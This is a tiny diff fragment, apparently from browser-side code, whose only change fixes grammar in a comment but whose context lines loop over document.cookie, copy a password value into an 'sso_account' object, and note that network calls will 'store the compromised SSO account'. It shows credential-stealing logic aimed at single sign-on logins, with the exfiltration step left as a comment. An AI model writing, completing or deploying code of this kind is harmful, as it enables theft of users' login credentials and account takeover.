@@ -18,6 +18,6 @@ for c in document.cookie.split(';')
     c.includes(PASSWORD) and sso_account.pw = c_stripped
 
 ###
-...make net calls to database,
+...make net calls to a database,
 store the compromised SSO account
 ###
